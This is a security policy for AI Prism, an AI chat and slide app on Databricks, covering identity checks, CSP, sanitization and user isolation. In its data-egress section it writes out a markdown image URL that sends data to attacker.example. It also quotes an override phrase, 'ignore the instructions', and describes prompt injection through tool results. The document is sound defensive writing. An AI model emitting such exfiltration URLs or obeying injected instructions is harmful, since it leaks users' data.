# Security Policy

**English** · [Português (Brasil)](docs/pt-BR/SECURITY.md) · [Español](docs/es/SECURITY.md)

AI Prism is an open-source solution accelerator that you deploy in **your own** Databricks workspace. It is not an official Databricks product and has no SLA. We still take vulnerabilities seriously. This document explains how to report them.

## Reporting a vulnerability

**Do not open a public issue** to report a security vulnerability.

Use GitHub's private channel instead:

1. Open the **Security** tab of the repository.
2. Click **Report a vulnerability** (GitHub Security Advisories).

If you prefer, open a minimal issue **with no technical details** asking for a private contact channel. The reply will come through that channel.

Include the following in your report, whenever possible:

- A description of the vulnerability and its potential impact.
- Steps to reproduce it (proof of concept).
- Affected versions and environment (cloud, Databricks CLI version, commit).
- Any mitigation you have already identified.

We will do our best to confirm receipt within a few business days and keep you informed of progress until the issue is resolved.

## Scope

Each installation runs in the workspace of the team that deploys it, so keep the project's trust model in mind:

- **Isolation between users is enforced at the application level** (`WHERE user_email` clauses), on top of an identity supplied by the Apps proxy. Reports of gaps in that isolation (one user accessing another user's data) are especially welcome.
- Authentication uses **user OBO (on-behalf-of)** for API calls, and the **app's service principal** for its own storage (Lakebase, the images Volume).
- Secrets (workspace tokens, Lakebase credentials) must **never** be committed. See [`.env.example`](.env.example) and [`.gitignore`](.gitignore). `.env` is ignored.

## Request identity

The user's identity comes only from the Apps proxy (`server/requestIdentity.ts`):

- In the Apps runtime (when `DATABRICKS_APP_NAME`, `DATABRICKS_APP_PORT`, or `DATABRICKS_APP_URL` is set), the request must carry the `x-forwarded-email` and `x-forwarded-access-token` headers. If either one is missing, the response is **401**. In that case, no email or token comes from the environment.
- Outside the runtime, the environment is used only with `LOCAL_DEV_MODE=1` (the `.env.local` from `npm run dev:local`) or `LOCAL_DEV_IDENTITY=1`. `NODE_ENV` does not count: npm sets it to `production` in the repo's scripts. In this mode the server listens only on `127.0.0.1` (`listenHost()`): a request without headers becomes the app owner, so the port is not exposed on the local network. In the Apps runtime it listens on `0.0.0.0`.

### Email-to-token binding (`server/identityBinding.ts`)

The header email scopes every query, and Lakebase connects as the app's service principal, not as the user. Without a binding, a request that reached the process without going through the proxy, with `x-forwarded-email: <anyone>` and any token, would become that person (including the owner or an admin). So, on every authenticated request, the app asks the workspace whose token it is (`SCIM /Me` with the token itself, the same call `server/authz.ts` uses for groups; the `iam.current-user:read` scope is granted automatically to the OBO token):

- The header email must equal the `userName` **or** any `emails[].value` of the token's owner (case-insensitive comparison). One match is enough: a `userName` that is not an email (an external user, such as `nome_dominio#EXT#@tenant…`, or a login that is not an email) passes if the email is in `emails`. Only when none matches is the response **401** `{"code":"identity_mismatch"}`. No other field counts: the `applicationId` of a service principal does not prove ownership of an email, and a `/Me` with neither `userName` nor `emails` (a service principal token) gives `identity_mismatch` under `enforce`. If the app must serve service principal calls through the proxy, use `warn` and check the logs for what the proxy forwards to them. A token that the workspace refuses (401, or 403 "Invalid access token") gives **401** `{"code":"invalid_token"}`.
- A definitive result is cached for 5 min (an unverified one, such as a timeout or a 5xx, for 30 s), keyed by the token's `sha256` (never the token in plain text), in a bounded LRU. Simultaneous requests with the same token make a single lookup.
- **Availability first:** if the workspace does not answer definitively (timeout of 3 s, 5xx, 403 for a missing scope, `DATABRICKS_HOST` not set), the request goes through and the log records `identity-binding: could not verify…` at most once a minute. Only a definitive answer blocks.

| `IDENTITY_BINDING` | Effect |
|---|---|
| (not set) | `enforce` in the Apps runtime; `off` in local dev |
| `enforce` | Mismatch or invalid token → 401 |
| `warn` | Mismatch or invalid token is **not rejected**: it only logs (`identity-binding: identity_mismatch: …` or `identity-binding: invalid_token: …`) and the request goes through. It is the **safe rollback** if a workspace behaves unexpectedly (for example, legitimate users getting 401) |
| `off` | Turns the check off (the previous behavior; no workspace lookup) |

Set it in the `env` of `app.yaml` (the `config.env` of `databricks.yml` does not reach the app). An invalid value falls back to the default (`enforce` in the runtime), so a typo never turns the check off.

**First deploy (or first deploy in a new workspace):** after you open the app with some real users, search the logs (`databricks apps logs <app> -p <PROFILE>`) for `identity_mismatch` and `invalid_token`. If there are no unexpected occurrences, keep `enforce`. If legitimate users get 401, set `IDENTITY_BINDING=warn` in the `env` of `app.yaml`, deploy, and collect the `identity-binding:` lines (they carry neither email nor token). Go back to `enforce` when the cause is fixed. Use `off` only if `warn` is not enough.

**What this verifies, and what still depends on the proxy.** The app verifies that the email and token pair was issued by the workspace for the same person. The platform still has to ensure that the proxy authenticates the user and is the only path to the process, and that it overwrites (does not pass through) the client's `x-forwarded-*` headers. Someone who steals a valid token from another person still acts as that person. That is the model of any bearer token.

## HTTP protections

| Protection | Where | What it blocks |
|---|---|---|
| **CSRF** | `server/csrfGuard.ts`, on `/api/*` before the body is parsed | `POST`/`PUT`/`PATCH`/`DELETE` from another site. The request passes with `Sec-Fetch-Site` `same-origin` or `none`, or with an `Origin` (or, without it, a `Referer`) whose host is the request's own host (`Host` or `X-Forwarded-Host`) or the host of `DATABRICKS_APP_URL`. The comparison covers scheme, host, and port, with the default port made explicit (`:443` on https, `:80` on http). Another port, or the same host and port over the other scheme, is a different origin. A request with none of the three headers (curl, scripts, `npm run smoke`) passes, because it does not come from a browser. Everything else gets **403** `{"code":"cross_site_request"}`. Reason: `/api/chat` accepts `multipart/form-data`, which a `<form>` on another site can send without a preflight |
| **Headers** | `server/securityHeaders.ts` | `X-Content-Type-Options: nosniff`, `Referrer-Policy: same-origin`, `X-Frame-Options: SAMEORIGIN`, no `X-Powered-By`, and an enforced CSP: `frame-ancestors 'self'; base-uri 'self'; object-src 'none'; form-action 'self'; default-src 'self'; script-src 'self' 'unsafe-inline'` plus the egress directives (`img-src`, `font-src`, `style-src`, `media-src`, `connect-src`, `frame-src`); `CSP_EGRESS=report` removes the egress and script directives |
| **Numeric ids** | `app.param(['id','messageId'])` | An id outside `^\d{1,18}$` skips the route and ends in 404. Without this check, it would reach Postgres and come back as a 500 with the driver's message |
| **Final error** | `finalErrorHandler` (last middleware) | An error that no route handled (malformed JSON, a body or upload that is too large, an exception) becomes a generic JSON response (`bad_request` 400, `payload_too_large` 413, `internal_error` 500). The detail goes only to the log. Routes that already handle their own errors did not change |

**What the CSP restricts for scripts, and what it cannot.** `srcdoc` iframes inherit the page's CSP. The slide editor injects an inline `<script>` into the iframe, and the imported design system brings inline scripts, so `script-src` is `'self' 'unsafe-inline'`: inline script keeps working, but a **remote** script (`<script src=https://host/x.js?d=<data>>`, whether a design-system card injects it or a slide gets it past the sanitizer) is blocked and reported. Neither `default-src` nor `script-src` ever takes an allowlisted origin, `blob:`, `'unsafe-eval'` or `*`: a script CDN serves code anyone can publish, so a design system that needs a library must vendor it in the zip. Navigating a sandboxed frame to an outside host is blocked by the enforced `frame-src 'self' blob:` (probed in Chromium: no request reached the listener). What stays open while inline script runs in a sandboxed frame is WebRTC: in the same probe, a STUN packet from the frame reached a loopback listener. Closing it requires serving those iframes from their own origin, with their own policy. HSTS and TLS are left to the Apps proxy.

**Depends on the proxy:** we have not verified the `SameSite` setting of the Apps session cookie, or whether the proxy adds its own security headers. The CSRF guard does not depend on this. It refuses a cross-site request even when the cookie is sent along.

## Isolation between users

All Postgres connections use the same identity (the app's service principal, or the local user in dev). So every read **and every write** must filter by owner in its own SQL: `chat_sessions.user_email` and, for anything that belongs to a session (messages, tool calls, embeddings, artifacts, the Genie conversation), an `EXISTS` on the caller's session. An enumerable numeric id (BIGSERIAL) cannot be enough on its own.

What this version strengthened:

- **Writes by id** that used to rely on an earlier check now re-check the owner in the same statement (`server/ownerScopedWrites.ts`): variant reactivation (the `variant_group` comes from the client), message embeddings, tool calls, the Genie conversation (read and write), skill embedding, and creation of decks, spreadsheets, documents, and images (a session that belongs to someone else gets a 404).
- **Two-user tests** in `server/isolation.test.js`, run against the real functions in `db.js`: sessions, messages, variants, tool calls, embeddings and semantic search, artifacts, MCP connections, skills, Genie, and costs. The suite runs with `node --test server/isolation.test.js` against the Postgres from `npm run local:up`, and it is skipped without that database. It fails on the code from before these changes (variants, tool calls, embeddings, artifacts, skills, and Genie).
- **Writes that depend on the route** (not re-checked in SQL): `upsertSkill`, `deleteSkill`, `updateDeckTemplate`, `deleteDeckTemplate`, and `setDeckTemplateScope` take an admin flag from the caller and are protected by the routes (`requireAdmin` / `isAdmin`). `getUsageStats` (cost audit across all users) does not filter by owner by design, so it may be exposed only behind `requireAdmin`. No route uses it today.

## Third-party content in the prompt

Text that the app does not write, and that goes to the model (descriptions, instructions, and schemas of MCP tools; Genie Agent titles and descriptions; Unity Catalog function comments; document titles), passes through `server/toolMetadata.ts`. Imperatives ("ignore the instructions"), role labels ("system:"), HTML, and links are neutralized, and the text is size-limited. This is a partial defense against prompt injection, not a guarantee. The model can still be influenced by text that does not match these patterns. For that reason, tool data must not be treated as a trusted instruction.

Markdown documents are saved without raw HTML and without links that use a dangerous scheme (`shared/markdownSafety.js`). The WYSIWYG editor renders with `innerHTML`, so this prevents a project member from running code in another member's editor.

### Design system HTML (template thumbnails)

A design system (DS) is HTML and CSS that comes from outside (an agency bundle, a Figma export, a zip file). A **global** DS appears to every user on the Templates screen. So the thumbnail of the first slide has two layers:

- **An iframe that always has a `sandbox`** (`client/src/components/DeckTemplatesSettings.tsx`). Without the attribute, a `srcdoc` document runs with the app's own origin and could call `/api/sessions` as the person viewing the screen (reading that person's chats). The thumbnail now uses `sandbox=""` (no scripts), and the DS inspector uses `sandbox="allow-scripts"` without `allow-same-origin` (an opaque origin, with no access to the API).
- **HTML sanitized on the server** (`server/sanitizeDsHtml.ts`, applied by `extractFirstTemplateSlide` in `server/db.ts` when the template is read, so it also covers DS that were already saved), with the `sanitize-html` library and an allowlist built for slides: structure, text, lists, tables, `img`, `svg` drawing, and `<style>` blocks. It drops `script`, `on*` attributes, `iframe`, `object`, `embed`, `base`, `meta`, `form`, and `foreignObject`. URLs: `http`, `https`, `mailto`, and relative URLs are allowed. `data:` is allowed only on `<img>` and only as `data:image/*`. `<use>` may only point to a `#fragment`. Tests are in `server/sanitizeDsHtml.test.ts`.
- **CSS without resources from other hosts** (`stripRemoteCssUrls`, in the same file). The sandbox blocks scripts, but it does not stop CSS from downloading files. This applies to `<style>` blocks, `style` attributes, and the SVG paint attributes (`fill`, `stroke`, `clip-path`, `mask`, `filter`, `marker-*`). The CSS is first **normalized**: each `/* */` comment outside strings becomes a single space (it separates tokens), NUL is removed (inside a string, `/* */` is text and stays), and escapes that spell an ASCII letter or `-` (`\68`, `h\74tp`) are decoded. The normalized text is both what is checked **and** what reaches the browser. The rules are:
  - a `url(…)` is kept only if its argument is exactly one quoted string, or one unquoted token whose value is a `data:` image or font URI, a relative path, or a `#fragment`;
  - anything else, or anything ambiguous (a stray quote, a leftover backslash, an unbalanced parenthesis), **removes the whole declaration**. If there is no balanced span, the removal runs to the end of the CSS;
  - `@import`, `image-set()`, `-webkit-image-set()`, `image()`, `cross-fade()`, `-webkit-cross-fade()`, `element()`, and `src()` are always removed;
  - an affected paint attribute becomes `none`, and an emptied `style` attribute is removed;
  - matching ignores case and also finds names inside strings, so it can only remove too much (for example, `content:"url(https://…)"` is removed too).

  This is **not** a CSS tokenizer. It is conservative by construction. It is also linear: two left-to-right passes with no rescanning, so the time grows in proportion to the input size. The tests require a 2 MB malformed input to finish in under 1 s. Without this layer, a global design system could make every viewer's browser call a third party (tracking). Visible effects: CSS comments become a single space, a CDN font imported by the DS stylesheet (for example, Google Fonts) no longer loads in the thumbnail, and an `@font-face` `src` list with any remote entry loses the whole `src` declaration. Brand fonts still arrive as `data:` URLs through the token CSS. **Still allowed:** `<img src>` over `http(s)`, under the URL policy above, which also makes an outbound request.
- **DS tokens validated on write** (`server/templatePayload.ts`, called by `validateTemplatePayload`). After sanitization, the client builds a `<style>` from `fontAssets[]` (family, weight, style, `dataUrl`), `headingFont`, `bodyFont`, and `palette[].varName`. So each field accepts only a list of characters (no quotes, `\`, `;`, `{`, `}`, `<`, `>`, or `/`) up to a maximum length, and `dataUrl` must be a base64 font (`font/*`, `application/(x-)font-*`, EOT, or `application/octet-stream`, which the importer uses for unknown extensions). An invalid payload gets a 400 that names the field.

**Why `sanitize-html`:** it is maintained, and it has specific defenses, with tests, for the cases where its parser and the browser disagree. It escapes `<` inside `<style>` under `svg` or `math`, escapes the content of `textarea` and `xmp`, and re-sanitizes the `iframe` fallback. Its parser (htmlparser2) is not spec-conformant: its own README says it takes shortcuts. The safety comes from those defenses, the allowlist, and the sandbox, not from the parser. It is plain JavaScript and runs on the server without a DOM. DOMPurify would need a DOM on Node (jsdom or linkedom), which is heavier for the bundle and one more dependency to maintain.

**Other `srcdoc` iframes reviewed:**

| Where | Sandbox | Assessment |
|---|---|---|
| `DeckTemplateInspector.tsx:120,131` and the thumbnail without `previewCardHtml` (`DeckTemplatesSettings.tsx`) | `allow-scripts` | Acceptable. The DS scripts run with an opaque origin (no cookies, no app `/api`, no navigation of the top page, no pop-ups). They can still make outbound network requests, but the frame holds only the DS itself. |
| `deck/HtmlSlideFrame.tsx`, `deck/HtmlSlideEditor.tsx` | `allow-scripts` | Acceptable with the layers below. The slide HTML comes from the model. The server (`sanitizeHtmlDeck`, `server/blocks.ts`) sanitizes it with the allowlist sanitizer on every save and on read (handlers, `javascript:` URLs, `<base>`, `<meta http-equiv>`, `<link>`, frames and forms, remote `src`, `srcset`, `url()` and `@import`), and the enforced CSP blocks remote loads, remote scripts and `connect-src`. The origin is opaque (no access to the API). Left open: WebRTC from inline script (see the CSP paragraph above). |
| `lib/domToSlideOps.ts:476`, `allow-same-origin`, no scripts | `allow-same-origin` | Acceptable. Hidden frame used to measure layout during export. Scripts and handlers do not run, and no node from the frame is moved into the main document. Do not add `allow-scripts` here: with `allow-same-origin`, that gives full access to the app. |
| `HtmlDeckPreview.tsx:53` | `allow-same-origin`, no scripts | Acceptable, same rule. The component is not imported anywhere (dead code, a candidate for removal). |

**Test follow-up:** the presence of the `sandbox` attribute is checked today in the source code (`server/iframeSandbox.test.js`). A UI test that renders the thumbnail and inspects the resulting `<iframe>` is still missing.

What this **does not** cover: the DS itself is still trusted content for the prompt (a global DS influences every user's decks), and the app's CSP (above) blocks remote scripts, images, fonts, styles and `connect-src` in these frames but still allows inline script, so WebRTC stays open (navigating the frame to an outside host is blocked by `frame-src`).

When the app fetches a URL chosen by the model (the web page tool), the connection follows only public addresses. Loopback, private networks, CGNAT, link-local (including the cloud metadata endpoint), ULA, and reserved addresses are blocked at every redirect hop. The same rule is in `server/a2aGuard.ts`, which will be used by A2A.

## Data leaving through model output (2.0.0)

Text that the model writes can be steered by what it reads (a document, a web page, an MCP or Genie result). A URL in that text can carry data: `![x](https://attacker.example/p.png?d=<data>)` makes the browser call the host with no click, and the same works for a remote font, stylesheet or script in a document, a slide or a design-system card. **Versions before 2.0.0 are exposed to this. Upgrade to 2.0.0.**

2.0.0 closes it in layers:

- **Enforced CSP** (`server/securityHeaders.ts`): images, fonts, styles, media, fetches and frames load only from the app, `data:` and `blob:`; `script-src 'self' 'unsafe-inline'` blocks remote scripts. One header covers every `srcdoc` frame (documents, slides, export, print), streaming and old messages alike.
- **Allowlist.** An admin adds origins in Settings > Administrators > *External asset origins* (stored in `app_settings.external_asset_origins`, live within about 15 s, audited as `egress.settings`); `EXTERNAL_ASSET_ORIGINS` in `app.yaml` is a floor. Entries are `https://host[:port]`, with no wildcard, path or IP, never the app, workspace or Databricks hosts. They open only `img-src`, `font-src` and `style-src`; never `connect-src`, `media-src`, `frame-src`, `default-src` or `script-src`.
- **Placeholder** for an external image in a chat answer or a document (host shown, no "load anyway").
- **Deck sanitizer** on save and on read, chat snapshots included; the design-system importer warns about external references it strips.
- **`web_fetch` provenance**: only a URL the user typed or a `web_search`/`web_fetch` result listed. Other tool results are not sources.
- **Artifact byte routes** (images, exports): sandbox CSP and `nosniff` on every one; `Content-Disposition: attachment` on downloads, exports and non-raster stored images (such as SVG). A raster image (PNG, JPEG...) that `/api/images/:id` serves for `<img>` stays inline.
- **Logs**: `egress_blocked` and `csp_violation`. URL-bearing values never keep a path or a query: `egress_blocked.hosts` holds hostnames, and `csp_violation.blocked` holds an origin (scheme, host and a non-default port) or a CSP keyword such as `inline`, `eval`, `data`, `blob`. Fields: `egress_blocked` has `surface`, `kind`, `hosts`, `count`, `route`, and `truncated` only when true; `csp_violation` has `directive`, `blocked`, `disposition`, and `document` only for an `about:srcdoc` or `about:blank` frame; the logger adds `request_id`, `user_hash` and `route`. See [docs/operations.md](docs/operations.md#617-egress-csp-200-allow-an-origin-emergency-switch-reading-the-logs).

`CSP_EGRESS=report` (exactly that value, in `app.yaml`, same build) reverts only the browser part to report-only. The placeholder, sanitizer, `web_fetch` rule and prompt rule stay on.

**What this does not cover.** Tool arguments are not a browser path: keep the serverless network policy restrictive (no outbound network for the Python tool), review which external MCP tools can write or publish and disable the ones not needed, and remember that web-search queries go to the provider the admin chose. WebRTC from inline script in sandboxed frames stays open until those frames get their own origin and policy (frame navigation is blocked by `frame-src`).

## Generated images (UC Volume)

Generated image bytes are written and read with the app service principal's token, under `/Volumes/<catalog>/<schema>/<volume>/<encoded email>/<uuid>.png` (`server/imageStore.ts`). Without service principal credentials (local development), the code uses the caller's own token (`storageToken`, `server/imageStore.ts:24-34`). Inside the app, an image is served only through the database row of its owner (`/api/images/:id`). **Outside the app there is no isolation per user:** anyone with `READ VOLUME` on that schema (the catalog owner, metastore admins, or broad grants on an existing catalog, as in workspaces with a shared metastore) can list and read every user's images, and can see from the path who generated each one. When you install the app, check that only the app's service principal has access to the images volume.

## TLS for Postgres (Lakebase)

By default the Postgres connection is **encrypted, but the certificate chain is not verified** (`ssl: { rejectUnauthorized: false }` in `server/db.ts`, function `pgSslOptions`). This is the project's historical choice, and it has a cost you should know about:

- **Why it exists**: the code does not record the original reason. The likely reason is operational: the app does not bundle the Lakebase CA, so validation against Node's default trust store would fail without extra configuration. The settings below make the CA configurable without changing the default.
- **Threat model**: the connection leaves the app's container and goes to the Lakebase endpoint inside the workspace network. Without verification, an attacker who can intercept that path could impersonate the endpoint and receive the service principal's token or the user's credential (which is the OBO token itself, used as the password). The risk is lower than on a public network, but it is not zero.
- **How to close it**: provide the CA, and verification turns on automatically.

| Variable | Effect |
|---|---|
| (none) | Encrypted, chain not verified (default, unchanged) |
| `PG_SSL_CA` | Inline PEM or file path with the CA. Turns verification on |
| `PG_SSL_REJECT_UNAUTHORIZED=1` | Verifies the chain (with or without `PG_SSL_CA`; without a CA it uses Node's trust store) |
| `PG_SSL_REJECT_UNAUTHORIZED=0` | Does not verify, even with `PG_SSL_CA` (for diagnostics) |
| `PGSSLMODE=disable` | No TLS (local database only) |

With `PG_SSL_CA`, the chain is verified by default, because a pinned CA that is not verified protects nothing. Use the CA that your Lakebase endpoint presents. It is listed in the Lakebase documentation for your workspace.

## Out of scope

- Vulnerabilities in the Databricks platform itself (report them to Databricks).
- Insecure configurations made by whoever deploys the app (for example, exposing secrets or granting overly broad permissions in the workspace).

## Good practices for deployers

- Always run the latest version of `main`.
- Do not hardcode hosts, tokens, or credentials in `app.yaml` or `databricks.yml`. The cloud-agnostic model injects everything at runtime (see the README).
- Restrict access to the app and the workspace with Databricks ACLs.
